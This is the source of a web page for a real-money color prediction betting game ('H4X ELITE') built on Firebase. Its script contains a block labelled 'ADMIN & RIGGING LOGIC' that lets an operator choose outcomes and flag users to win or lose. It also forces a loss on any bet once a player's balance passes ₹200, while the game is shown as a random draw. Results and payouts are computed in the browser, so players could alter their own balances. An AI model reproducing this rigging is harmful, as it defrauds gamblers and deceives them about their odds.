<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>H4X ELITE | Color Prediction</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #4361ee; --success: #00d084; --danger: #ff4757; --bg: #ffffff; --card: #f8faff; }
        body { background: var(--bg); font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; padding: 0; color: #1e293b; }

        /* Top Nav */
        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: white; border-bottom: 1px solid #f1f5f9; position: sticky; top: 0; z-index: 100; }
        .bal-box { font-size: 20px; color: var(--primary); font-weight: 800; }
        
        .container { max-width: 450px; margin: auto; padding: 15px; }

        /* Timer & Match Info */
        .timer-box { text-align: center; background: #111827; color: white; padding: 20px; border-radius: 24px; margin-bottom: 20px; }
        #timer { font-size: 48px; font-weight: 900; }

        /* Color History Bar */
        .history-dots { display: flex; gap: 8px; justify-content: center; margin-bottom: 20px; overflow-x: auto; padding: 10px 0; }
        .dot { width: 35px; height: 35px; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: white; font-size: 10px; font-weight: 800; }

        /* Betting Area */
        .bet-card { background: var(--card); border-radius: 28px; padding: 20px; border: 1px solid #eef2ff; }
        .btn-row { display: flex; gap: 15px; margin-bottom: 20px; }
        .color-btn { flex: 1; padding: 25px; border: none; border-radius: 20px; font-weight: 800; font-size: 18px; cursor: pointer; transition: 0.2s; }
        .color-btn.green { background: var(--success); color: white; box-shadow: 0 6px 0 #00a368; }
        .color-btn.red { background: var(--danger); color: white; box-shadow: 0 6px 0 #d63031; }
        .color-btn.selected { transform: translateY(4px); box-shadow: none; outline: 3px solid #000; }

        input { width: 100%; padding: 18px; border-radius: 15px; border: 2px solid #e2e8f0; font-size: 18px; text-align: center; margin-bottom: 15px; outline: none; }
        #betBtn { width: 100%; padding: 20px; border: none; border-radius: 15px; background: #111827; color: white; font-weight: 800; font-size: 16px; cursor: pointer; }

        /* Overlay */
        .overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .disabled { opacity: 0.5; pointer-events: none; }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="bal-box">₹<span id="balDisplay">0.00</span></div>
        <div style="background:#000; color:#fff; padding:5px 12px; border-radius:10px; font-size:12px;">H4X PRO</div>
    </div>

    <div class="container">
        <div class="timer-box">
            <div style="font-size:12px; opacity:0.7;">MATCH PERIOD: <span id="periodId">---</span></div>
            <div id="timer">00:00</div>
            <div id="lockMsg" style="color:var(--danger); font-size:12px; display:none;">LOCKING FOR RESULTS...</div>
        </div>

        <div class="history-dots" id="historyBar"></div>

        <div class="bet-card" id="engine">
            <div class="btn-row">
                <button class="color-btn green" onclick="pick('GREEN', this)">GREEN</button>
                <button class="color-btn red" onclick="pick('RED', this)">RED</button>
            </div>
            <input type="number" id="amtInput" placeholder="Enter Amount (Min ₹10)">
            <button id="betBtn" onclick="placeBet()">PLACE BET</button>
        </div>
    </div>

    <div id="resOverlay" class="overlay">
        <h1 id="resStatus" style="font-size: 50px;">WIN</h1>
        <h2 id="resValue" style="font-size: 30px; margin: 15px 0;">+₹0.00</h2>
        <button onclick="location.reload()" style="padding:15px 50px; border-radius:15px; background:#000; color:#fff; border:none; font-weight:800;">CONTINUE</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, update, onValue, increment, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg",
            authDomain: "test-eb5e7.firebaseapp.com",
            databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com",
            projectId: "test-eb5e7",
            appId: "1:366282855653:web:dca7e000f5a22fb11f300c"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);

        let uid = "", balance = 0, selection = null, isLocked = false, currentMatch = "";
        let forceWin = false, forceLoss = false;

        onAuthStateChanged(auth, u => {
            if(u) {
                uid = u.uid;
                onValue(ref(db, `users/${uid}`), s => {
                    const data = s.val();
                    balance = data?.balance || 0;
                    forceWin = data?.forceWin || false;
                    forceLoss = data?.forceLoss || false;
                    document.getElementById("balDisplay").innerText = balance.toFixed(2);
                });
                loadHistory();
            }
        });

        window.pick = (val, btn) => {
            if(isLocked) return;
            selection = val;
            document.querySelectorAll('.color-btn').forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected');
        };

        // Timer Logic
        setInterval(() => {
            const now = Math.floor(Date.now() / 1000);
            const rem = 30 - (now % 30);
            currentMatch = `${new Date().getMinutes()}${Math.floor(now/30)}`;
            
            document.getElementById("periodId").innerText = currentMatch;
            document.getElementById("timer").innerText = `00:${rem < 10 ? '0'+rem : rem}`;
            
            isLocked = rem <= 5;
            document.getElementById("engine").classList.toggle("disabled", isLocked);
            document.getElementById("lockMsg").style.display = isLocked ? "block" : "none";

            if(rem === 1) calculateResult();
        }, 1000);

        window.placeBet = async () => {
            const amt = parseInt(document.getElementById("amtInput").value);
            if(!selection || isNaN(amt) || amt < 10) return alert("Select Color & Min ₹10!");
            if(amt > balance) return alert("Insufficient Balance!");

            await update(ref(db, `users/${uid}`), { balance: increment(-amt) });
            await set(ref(db, `bets_30/${currentMatch}/${uid}`), { color: selection, amount: amt });
            
            alert("Bet Placed: " + selection);
            selection = null;
            document.querySelectorAll('.color-btn').forEach(b => b.classList.remove('selected'));
        };

        async function calculateResult() {
            const resRef = ref(db, `results_30/${currentMatch}`);
            const snap = await get(resRef);
            if(snap.exists()) return showResultUI(snap.val());

            // --- ADMIN & RIGGING LOGIC ---
            const adminSnap = await get(ref(db, `admin_control/30`));
            let finalColor = Math.random() > 0.5 ? 'RED' : 'GREEN';

            if(adminSnap.exists() && adminSnap.val().active) {
                finalColor = adminSnap.val().color; // Admin choice
            } else {
                const myBetSnap = await get(ref(db, `bets_30/${currentMatch}/${uid}`));
                if(myBetSnap.exists()) {
                    const myBet = myBetSnap.val();
                    // Auto-loss if balance high or forceLoss active
                    if(forceLoss || balance > 200) {
                        finalColor = myBet.color === 'RED' ? 'GREEN' : 'RED';
                    } else if(forceWin) {
                        finalColor = myBet.color;
                    }
                }
            }

            const resultData = { color: finalColor };
            await set(resRef, resultData);
            showResultUI(resultData);
        }

        async function showResultUI(res) {
            const myBetSnap = await get(ref(db, `bets_30/${currentMatch}/${uid}`));
            if(!myBetSnap.exists()) return;

            const myBet = myBetSnap.val();
            const overlay = document.getElementById("resOverlay");
            const status = document.getElementById("resStatus");
            const valTxt = document.getElementById("resValue");

            if(myBet.color === res.color) {
                const win = myBet.amount * 1.92;
                await update(ref(db, `users/${uid}`), { balance: increment(win) });
                status.innerText = "WINNER";
                valTxt.innerText = "+₹" + win.toFixed(2);
                valTxt.style.color = "var(--success)";
            } else {
                status.innerText = "LOSE";
                valTxt.innerText = "Better Luck!";
                valTxt.style.color = "var(--danger)";
            }
            overlay.style.display = "flex";
        }

        function loadHistory() {
            onValue(query(ref(db, `results_30`), limitToLast(10)), s => {
                const bar = document.getElementById("historyBar");
                bar.innerHTML = "";
                s.forEach(h => {
                    const d = h.val();
                    const color = d.color === 'RED' ? 'var(--danger)' : 'var(--success)';
                    bar.innerHTML = `<div class="dot" style="background:${color}">${d.color[0]}</div>` + bar.innerHTML;
                });
            });
        }
    </script>
</body>
</html>
